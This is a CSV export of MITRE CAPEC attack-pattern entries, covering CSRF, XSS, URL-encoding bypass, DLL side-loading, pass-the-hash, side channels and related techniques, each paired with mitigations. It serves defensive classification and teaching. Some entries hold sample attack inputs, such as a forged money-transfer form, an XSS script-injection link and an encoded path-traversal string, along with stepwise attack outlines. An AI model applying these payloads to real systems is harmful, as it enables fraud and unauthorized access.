CAPEC-619,Signal Strength Tracking,Detailed,Draft,"In this attack scenario, the attacker passively monitors the signal strength of the target’s cellular RF signal or WiFi RF signal and uses the strength of the signal (with directional antennas and/or from multiple listening points at once) to identify the source location of the signal. Obtaining the signal of the target can be accomplished through multiple techniques such as through Cellular Broadcast Message Request or through the use of IMSI Tracking or WiFi MAC Address Tracking.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,N/A,::SKILL:Commercial tools are available.:LEVEL:Low::,N/A,N/A,N/A,N/A,N/A,::201::,N/A,N/A,https://capec.mitre.org/data/definitions/619.html
CAPEC-62,Cross Site Request Forgery,Standard,Draft,"An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply riding the existing session cookie.",::TERM:Session Riding:DESCRIPTION:::,High,Very High,::NATURE:ChildOf:CAPEC ID:21::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Explore target website] The attacker first explores the target website to determine pieces of functionality that are of interest to them (e.g. money transfers). The attacker will need a legitimate user account on the target website. It would help to have two accounts.TECHNIQUE:Use web application debugging tool such as WebScarab, Tamper Data or TamperIE to analyze the information exchanged between the client and the server:TECHNIQUE:Use network sniffing tool such as Wireshark to analyze the information exchanged between the client and the server:TECHNIQUE:View HTML source of web pages that contain links or buttons that perform actions of interest.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create a link that when clicked on, will execute the interesting functionality.] The attacker needs to create a link that will execute some interesting functionality such as transfer money, change a password, etc.TECHNIQUE:Create a GET request containing all required parameters (e.g. https://www.somebank.com/members/transfer.asp?to=012345678901&amt=10000):TECHNIQUE:Create a form that will submit a POST request (e.g. <form method=POST action=https://www.somebank.com/members/transfer.asp><input type=hidden Name=to value=012345678901/><input type=hidden Name=amt value=10000/><input type=submit src=clickhere.jpg/></form>::STEP:3:PHASE:Exploit:DESCRIPTION:[Convince user to click on link] Finally, the attacker needs to convince a user that is logged into the target website to click on a link to execute the CSRF attack.TECHNIQUE:Execute a phishing attack and send the user an e-mail convincing them to click on a link.:TECHNIQUE:Execute a stored XSS attack on a website to permanently embed the malicious link into the website.:TECHNIQUE:Execute a stored XSS attack on a website where an XMLHTTPRequest object will automatically execute the attack as soon as a user visits the page. This removes the step of convincing a user to click on a link.:TECHNIQUE:Include the malicious link on the attackers' own website where the user may have to click on the link, or where an XMLHTTPRequest object may automatically execute the attack when a user visits the site.::",N/A,::SKILL:The attacker needs to figure out the exact invocation of the targeted malicious action and then craft a link that performs the said action. Having the user click on such a link is often accomplished by sending an email or posting such a link to a bulletin board or the likes.:LEVEL:Medium::,::All the attacker needs is the exact representation of requests to be made to the application and to be able to get the malicious link across to a victim.::,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.::Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.::Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.::In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context.::","::While a user is logged into their bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email. The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account. The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie.See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail.::",::352::306::664::732::1275::,TAXONOMY NAME:WASC:ENTRY ID:09:ENTRY NAME:Cross-Site Request Forgery::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cross Site Request Forgery (CSRF)::,N/A,https://capec.mitre.org/data/definitions/62.html
CAPEC-621,Analysis of Packet Timing and Sizes,Detailed,Draft,"An attacker may intercept and log encrypted transmissions for the purpose of analyzing metadata such as packet timing and sizes. Although the actual data may be encrypted, this metadata may reveal valuable information to an attacker. Note that this attack is applicable to VOIP data as well as application data, especially for interactive apps that require precise timing and low-latency (e.g. thin-clients).",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:189::,N/A,"::Use of untrusted communication paths enables an attacker to intercept and log communications, including metadata such as packet timing and sizes.::",::SKILL:These attacks generally require sophisticated machine learning techniques and require traffic capture as a prerequisite.:LEVEL:High::,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Derive sensitive information about encrypted data.::,::Distort packet sizes and timing at VPN layer by adding padding to normalize packet sizes and timing delays to reduce information leakage via timing.::,N/A,::201::,N/A,N/A,https://capec.mitre.org/data/definitions/621.html
CAPEC-622,Electromagnetic Side-Channel Attack,Detailed,Draft,"In this attack scenario, the attacker passively monitors electromagnetic emanations that are produced by the targeted electronic device as an unintentional side-effect of its processing. From these emanations, the attacker derives information about the data that is being processed (e.g. the attacker can recover cryptographic keys by monitoring emanations associated with cryptographic processing). This style of attack requires proximal access to the device, however attacks have been demonstrated at public conferences that work at distances of up to 10-15 feet. There have not been any significant studies to determine the maximum practical distance for such attacks. Since the attack is passive, it is nearly impossible to detect and the targeted device will continue to operate as normal after a successful attack.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:189::,N/A,::Proximal access to the device.::,"::SKILL:Sophisticated attack, but detailed techniques published in the open literature.:LEVEL:Medium::",N/A,N/A,"::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Derive sensitive information about encrypted data. For mobile devices, depending on which keys are compromised, the attacker may be able to decrypt VOIP communications, impersonate the targeted caller, or access the enterprise VPN server.::",::Utilize side-channel resistant implementations of all crypto algorithms.::Strong physical security of all devices that contain secret key information. (even when devices are not in use)::,N/A,::201::,N/A,N/A,https://capec.mitre.org/data/definitions/622.html
CAPEC-623,Compromising Emanations Attack,Detailed,Draft,"Compromising Emanations (CE) are defined as unintentional signals which an attacker may intercept and analyze to disclose the information processed by the targeted equipment. Commercial mobile devices and retransmission devices have displays, buttons, microchips, and radios that emit mechanical emissions in the form of sound or vibrations. Capturing these emissions can help an adversary understand what the device is doing.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:189::,N/A,::Proximal access to the device.::,::SKILL:Sophisticated attack.:LEVEL:High::,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Capture vibrations/emissions from the handset or retransmission device display screen to recreat display information from a distance.::,::None are known.::,N/A,::201::,N/A,N/A,https://capec.mitre.org/data/definitions/623.html
CAPEC-63,Cross-Site Scripting (XSS),Standard,Draft,"An adversary embeds malicious scripts in content that will be served to web browsers. The goal of the attack is for the target software, the client-side browser, to execute the script with the users' privilege level. An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute code and scripts. Web browsers, for example, have some simple security controls in place, but if a remote attacker is allowed to execute scripts (through injecting them in to user-generated content like bulletin boards) then these controls may be bypassed. Further, these attacks are very difficult for an end user to detect.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:242::NATURE:CanPrecede:CAPEC ID:107::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of XSS probe strings to inject script into UI entry fields. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a list of XSS probe strings to inject script into resources accessed by the application. If possible, the probe strings contain a unique identifier.::STEP:3:PHASE:Exploit:DESCRIPTION:[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, they can choose to steal user's credentials in order to reuse or to analyze them later on.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.::","::Target client software must be a client that allows scripting communication from remote hosts, such as a JavaScript-enabled Web Browser.::","::SKILL:To achieve a redirection and use of less trusted source, an attacker can simply place a script in bulletin board, blog, wiki, or other user-generated content site that are echoed back to other client machines.:LEVEL:Low::SKILL:Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.:LEVEL:High::",::Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine.::,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type, character, and encoding enforcement::Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Session tokens for specific host::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::","::Classic phishing attacks lure users to click on content that appears trustworthy, such as logos, and links that seem to go to their trusted financial institutions and online auction sites. But instead the attacker appends malicious scripts into the otherwise innocent appearing resources. The HTML source for a standard phishing attack looks like this: <a href=www.exampletrustedsite.com?Name=<script>maliciousscript</script>>Trusted Site</a> When the user clicks the link, the appended script also executes on the local user's machine.::",::79::20::,TAXONOMY NAME:WASC:ENTRY ID:08:ENTRY NAME:Cross-Site Scripting::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cross Site Scripting (XSS)::,N/A,https://capec.mitre.org/data/definitions/63.html
CAPEC-633,Token Impersonation,Detailed,Stable,"An adversary exploits a weakness in authentication to create an access token (or equivalent) that impersonates a different entity, and then associates a process/thread to that that impersonated token. This action causes a downstream user to make a decision or take action that is based on the assumed identity, and not the response that blocks the adversary.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:194::,N/A,"::This pattern of attack is only applicable when a downstream user leverages tokens to verify identity, and then takes action based on that identity.::",N/A,N/A,N/A,"::SCOPE:IntegrityTECHNICAL IMPACT:Alter Execution Logic:NOTE:Integrity Alter Execution Logic By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.::SCOPE:IntegrityTECHNICAL IMPACT:Gain Privileges:NOTE:Integrity Gain Privileges By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.::SCOPE:IntegrityTECHNICAL IMPACT:Hide Activities:NOTE:Integrity Hide Activities Faking the source of data or services can be used to create a false trail in logs as the target will associated any actions with the impersonated identity instead of the adversary.::",N/A,N/A,::287::1270::,TAXONOMY NAME:ATTACK:ENTRY ID:1134:ENTRY NAME:Access Token Manipulation::,N/A,https://capec.mitre.org/data/definitions/633.html
CAPEC-639,Probe System Files,Detailed,Stable,"An adversary obtains unauthorized information due to improperly protected files. If an application stores sensitive information in a file that is not protected by proper access control, then an adversary can access the file and search for sensitive information.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:545::,N/A,::An adversary has access to the file system of a system.::,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Verify that files have proper access controls set, and reduce the storage of sensitive information to only what is necessary.::","::Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.::Adversaries may search network shares on computers they have compromised to find files of interest.::",::552::,TAXONOMY NAME:ATTACK:ENTRY ID:1552.001:ENTRY NAME:Unsecured Credentials:Credentials in Files::::TAXONOMY NAME:ATTACK:ENTRY ID:1039:ENTRY NAME:Data from Network Shared Drive::,N/A,https://capec.mitre.org/data/definitions/639.html
CAPEC-64,Using Slashes and URL Encoding Combined to Bypass Validation Logic,Detailed,Draft,"This attack targets the encoding of the URL combined with the encoding of the slash characters. An attacker can take advantage of the multiple ways of encoding a URL and abuse the interpretation of the URL. A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:The attacker accesses the server using a specific URL.::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker tries to encode some special characters in the URL. The attacker find out that some characters are not filtered properly.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker crafts a malicious URL string request and sends it to the server.::STEP:4:PHASE:Exploit:DESCRIPTION:The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters have harmful consequences.::",::The application accepts and decodes URL string request.::The application performs insufficient filtering/canonicalization on the URLs.::,::SKILL:An attacker can try special characters in the URL and bypass the URL validation.:LEVEL:Low::SKILL:The attacker may write a script to defeat the input filtering mechanism.:LEVEL:Medium::,N/A,"::If the first decoding process has left some invalid or denylisted characters, that may be a sign that the request is malicious.::Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.::",::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.::When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible.::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.::Refer to the RFCs to safely decode URL.::Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).::","::Attack Example: Combined Encodings CesarFTP Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks. An attacker could provide a URL that included a string like /...%5C/ This is an interesting exploit because it involves an aggregation of several tricks: the escape character, URL encoding, and the triple dot.See also: CVE-2001-1335::",::177::173::172::73::22::74::20::697::707::,N/A,N/A,https://capec.mitre.org/data/definitions/64.html
CAPEC-641,DLL Side-Loading,Detailed,Stable,"An adversary places a malicious version of a Dynamic-Link Library (DLL) in the Windows Side-by-Side (WinSxS) directory to trick the operating system into loading this malicious DLL instead of a legitimate DLL. Programs specify the location of the DLLs to load via the use of WinSxS manifests or DLL redirection and if they aren't used then Windows searches in a predefined set of directories to locate the file. If the applications improperly specify a required DLL or WinSxS manifests aren't explicit about the characteristics of the DLL to be loaded, they can be vulnerable to side-loading.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:159::,N/A,::The target must fail to verify the integrity of the DLL before using them.::,::SKILL:Trick the operating system in loading a malicious DLL instead of a legitimate DLL.:LEVEL:High::,N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Bypass Protection Mechanism::,::Prevent unknown DLLs from loading through using an allowlist policy.::Patch installed applications as soon as new updates become available.::Properly restrict the location of the software being used.::Use of sxstrace.exe on Windows as well as manual inspection of the manifests.::Require code signing and avoid using relative paths for resources.::,N/A,::706::,TAXONOMY NAME:ATTACK:ENTRY ID:1574.002:ENTRY NAME:Hijack Execution Flow:DLL Side-Loading::,N/A,https://capec.mitre.org/data/definitions/641.html
CAPEC-642,Replace Binaries,Detailed,Draft,"Adversaries know that certain binaries will be regularly executed as part of normal processing. If these binaries are not protected with the appropriate file system permissions, it could be possible to replace them with malware. This malware might be executed at higher system permission levels. A variation of this pattern is to discover self-extracting installation packages that unpack binaries to directories with weak file permissions which it does not clean up appropriately. These binaries can be replaced by malware, which can then be executed.",N/A,N/A,High,::NATURE:ChildOf:CAPEC ID:17::,N/A,::The attacker must be able to place the malicious binary on the target machine.::,N/A,N/A,N/A,N/A,::Insure that binaries commonly used by the system have the correct file permissions. Set operating system policies that restrict privilege elevation of non-Administrators. Use auditing tools to observe changes to system services.::,"::The installer for a previous version of Firefox would use a DLL maliciously placed in the default download directory instead of the existing DLL located elsewhere, probably due to DLL hijacking. This DLL would be run with administrator privileges if the installer has those privileges.::By default, the Windows screensaver application SCRNSAVE.exe leverages the scrnsave.scr Portable Executable (PE) file in C:Windowssystem32. This value is set in the registry at HKEY_CURRENT_USERControl PanelDesktop, which can be modified by an adversary to instead point to a malicious program. This program would then run any time the SCRNSAVE.exe program is activated and with administrator privileges. An adversary may additionally modify other registry values within the same location to set the SCRNSAVE.exe program to run more frequently.::",::732::,TAXONOMY NAME:ATTACK:ENTRY ID:1574.005:ENTRY NAME:Hijack Execution Flow:Executable Installer File Permissions Weakness::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.010:ENTRY NAME:Hijack Execution Flow:Service File Permissions Weakness::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Binary planting::,N/A,https://capec.mitre.org/data/definitions/642.html
CAPEC-643,Identify Shared Files/Directories on System,Detailed,Draft,"An adversary discovers connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. Through the identification of shared folders/drives between systems, the adversary may further their goals of locating and collecting sensitive information/files, or map potential routes for lateral movement within the network.",N/A,Medium,Medium,::NATURE:ChildOf:CAPEC ID:309::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:545::NATURE:CanPrecede:CAPEC ID:165::,N/A,"::The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).::","::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line. The adversary, or their malware, can simply employ a set of commands that search for shared drives on the system (e.g., net view remote system or net share).:LEVEL:Low::",::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The adversary is potentially able to identify the location of sensitive information or lateral pathways through the network.::,"::Identify unnecessary system utilities or potentially malicious software that may contain functionality to identify network share information, and audit and/or block them by using allowlist tools.::",N/A,::267::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1135:ENTRY NAME:Network Share Discovery::,N/A,https://capec.mitre.org/data/definitions/643.html
CAPEC-644,Use of Captured Hashes (Pass The Hash),Detailed,Stable,An adversary obtains (i.e. steals or purchases) legitimate Windows domain credential (e.g. userID and password) hash values to access systems within the domain that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.,N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:653::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:165::NATURE:CanPrecede:CAPEC ID:549::NATURE:CanPrecede:CAPEC ID:545::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known Windows credential hash value pairs] The adversary must obtain known Windows credential hash value pairs of accounts that exist on the domain.TECHNIQUE:An adversary purchases breached Windows credential hash value pairs from the dark web.:TECHNIQUE:An adversary conducts a sniffing attack to steal Windows credential hash value pairs as they are transmitted.:TECHNIQUE:An adversary gains access to a Windows domain system/files and exfiltrates Windows credential hash value pairs.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded Windows credential hash value pairs.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt domain authentication] Try each Windows credential hash value pair until the target grants access.TECHNIQUE:Manually or automatically enter each Windows credential hash value pair through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications.::",::The system/application is connected to the Windows domain.::The system/application leverages the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.::The adversary possesses known Windows credential hash value pairs that exist on the target domain.::,"::SKILL:Once an adversary obtains a known Windows credential hash value pair, leveraging it is trivial.:LEVEL:Low::",::A list of known Window credential hash value pairs for the targeted domain.::,::Authentication attempts use credentials that have been used previously by the account in question.::Authentication attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:AuthorizationTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Prevent the use of Lan Man and NT Lan Man authentication on severs and apply patch KB2871997 to Windows 7 and higher systems.::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::Monitor system and domain logs for abnormal credential access.::Create a strong password policy and ensure that your system enforces this policy.::Leverage system penetration testing and other defense in depth methods to determine vulnerable systems within a domain.::,"::Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credential hash value pairs from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]::Operation Soft Cell, which has been underway since at least 2012, leveraged a modified Mimikatz that dumped NTLM hashes. The acquired hashes were then used to authenticate to other systems within the network via Pass The Hash attacks. [REF-580]::",::522::836::308::294::308::,TAXONOMY NAME:ATTACK:ENTRY ID:1550.002:ENTRY NAME:Use Alternate Authentication Material:Pass The Hash::,N/A,https://capec.mitre.org/data/definitions/644.html
CAPEC-645,Use of Captured Tickets (Pass The Ticket),Detailed,Stable,"An adversary uses stolen Kerberos tickets to access systems/resources that leverage the Kerberos authentication protocol. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. An adversary can obtain any one of these tickets (e.g. Service Ticket, Ticket Granting Ticket, Silver Ticket, or Golden Ticket) to authenticate to a system/resource without needing the account's credentials. Depending on the ticket obtained, the adversary may be able to access a particular resource or generate TGTs for any account within an Active Directory Domain.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:652::NATURE:CanPrecede:CAPEC ID:151::,N/A,::The adversary needs physical access to the victim system.::The use of a third-party credential harvesting tool.::,::SKILL:Determine if Kerberos authentication is used on the server.:LEVEL:Low::SKILL:The adversary uses a third-party tool to obtain the necessary tickets to execute the attack.:LEVEL:High::,N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Gain Privileges::,::Reset the built-in KRBTGT account password twice to invalidate the existence of any current Golden Tickets and any tickets derived from them.::Monitor system and domain logs for abnormal access.::,"::Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]::",::522::294::308::,TAXONOMY NAME:ATTACK:ENTRY ID:1550.003:ENTRY NAME:Use Alternate Authentication Material:Pass The Ticket::,N/A,https://capec.mitre.org/data/definitions/645.html
CAPEC-646,Peripheral Footprinting,Standard,Stable,"Adversaries may attempt to obtain information about attached peripheral devices and components connected to a computer system. Examples may include discovering the presence of iOS devices by searching for backups, analyzing the Windows registry to determine what USB devices have been connected, or infecting a victim system with malware to report when a USB device has been connected. This may allow the adversary to gain additional insight about the system or network environment, which may be useful in constructing further attacks.",N/A,Low,Medium,::NATURE:ChildOf:CAPEC ID:169::,N/A,::The adversary needs either physical or remote access to the victim system.::,"::SKILL:The adversary needs to be able to infect the victim system in a manner that gives them remote access.:LEVEL:Medium::SKILL:If analyzing the Windows registry, the adversary must understand the registry structure to know where to look for devices.:LEVEL:Medium::",N/A,N/A,N/A,::Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::,N/A,::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1120:ENTRY NAME:Peripheral Device Discovery::,N/A,https://capec.mitre.org/data/definitions/646.html
CAPEC-647,Collect Data from Registries,Detailed,Draft,"An adversary exploits a weakness in authorization to gather system-specific data and sensitive information within a registry (e.g., Windows Registry, Mac plist). These contain information about the system configuration, software, operating system, and security. The adversary can leverage information gathered in order to carry out further attacks.",N/A,Medium,Medium,::NATURE:ChildOf:CAPEC ID:150::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Gain logical access to system] An adversary must first gain logical access to the system it wants to gather registry information from,TECHNIQUE:Obtain user account credentials and access the system:TECHNIQUE:Plant malware on the system that will give remote logical access to the adversary::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine if the permissions are correct] Once logical access is gained, an adversary will determine if they have the proper permissions, or are authorized, to view registry information. If they do not, they will need to escalate privileges on the system through other means::STEP:3:PHASE:Experiment:DESCRIPTION:[Peruse registry for information] Once an adversary has access to a registry, they will gather all system-specific data and sensitive information that they deem useful.::STEP:4:PHASE:Exploit:DESCRIPTION:[Follow-up attack] Use any information or weaknesses found to carry out a follow-up attack::","::The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).::The adversary must have capability to navigate the operating system to peruse the registry.::","::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line.:LEVEL:Low::",::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The adversary is able to read sensitive information about the system in the registry.::,"::Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.::Employ robust identification and audit/blocking via using an allowlist of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.::",N/A,::285::,TAXONOMY NAME:ATTACK:ENTRY ID:1552.002:ENTRY NAME:Unsecured Credentials:Credentials in Registry::::TAXONOMY NAME:ATTACK:ENTRY ID:1005:ENTRY NAME:Data from Local System::,N/A,https://capec.mitre.org/data/definitions/647.html
